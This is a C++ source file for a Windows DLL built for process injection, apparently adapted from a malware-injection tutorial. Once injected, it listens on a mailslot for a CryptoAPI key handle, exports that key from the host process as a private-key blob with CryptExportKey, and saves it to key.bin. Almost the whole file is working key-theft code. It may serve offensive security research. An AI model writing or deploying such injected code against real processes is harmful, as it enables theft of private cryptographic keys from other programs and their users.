/*
Template auhtor
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

#include "program_result.h"
using ErrorResult = error_handling::ErrorResult;
using OkResult = error_handling::OkResult;

#include "injection/interproc_coms.h"
using namespace process_injection;

DWORD timeout_millis = 20000;

int StartMailSlot();

extern "C" __declspec(dllexport) void StartServer(LPVOID lpParam) {
  StartMailSlot();
  /*
  NamedPipeServer server = NamedPipeServer(kPipeName, timeout_millis);
  // ShowGUIMessage("Creating server");
  server.CreateServer();
  // ShowGUIMessage("Waiting for connection");
  error_handling::ProgramResult pr = server.WaitForConnection();
  // ShowGUIMessage(pr.GetResultInformation());
  if (pr.IsOk()) {
    // ShowGUIMessage("Entering server loop");
    server.ServerLoop();
  } // else ShowGUIMessage("Did not enter server loop due to previous error");
  // ShowGUIMessage("Closing server");
  server.CloseServer();
  */
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    ShowGUIMessage("Successfully injected");
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}

#include <wincrypt.h>
#include <iostream>
#define PRIVATEKEYBLOB_SIZE 0x254
int StartMailSlot() {
  ShowGUIMessage("Starting mailslot");
  LPCSTR slot_name = "\\\\.\\mailslot\\MyMailslot";
  
  // Create the mailslot
  HANDLE hMailslot = CreateMailslotA(slot_name, 4, MAILSLOT_WAIT_FOREVER, NULL);
  if (hMailslot == INVALID_HANDLE_VALUE) {
    std::cerr << "Failed to create mailslot. Error: " << GetLastError() << std::endl;
    return 1;
  }
  std::cout << "Mailslot created. Waiting for messages..." << std::endl;

  while (true) {
    DWORD bytesRead;
    unsigned char buffer[4];  // 4-byte buffer

    if (ReadFile(hMailslot, buffer, sizeof(buffer), &bytesRead, NULL)) {
      std::cout << "Received message: ";
      for (SIZE_T i = 0; i < bytesRead; ++i) {
        printf("%02X ", buffer[i]);
      } printf("\n");
      
      HCRYPTKEY key = *(reinterpret_cast<HCRYPTKEY*>(buffer));
      printf("Exporting key: %08X\n", key);

      BYTE key_buffer[PRIVATEKEYBLOB_SIZE];
      ZeroMemory(key_buffer, PRIVATEKEYBLOB_SIZE);
      DWORD data_len = PRIVATEKEYBLOB_SIZE;
      BOOL res = CryptExportKey(
        key,
        NULL,
        PRIVATEKEYBLOB,
        0,
        key_buffer,
        &data_len
      );

      if (res == 0) std::cerr << " [x] Could not export the key: " << error_handling::GetLastErrorAsString() << std::endl;
      else {
        printf(" [i] Key successfully exported, exporting it to a file\n");
        FILE* file = fopen("key.bin", "wb");
        fwrite(key_buffer, 1, data_len, file);
        fclose(file);
      }
    } else {
      std::cerr << "Failed to read from mailslot. Error: " << GetLastError() << std::endl;
    }
  }

  CloseHandle(hMailslot);
  return 0;
}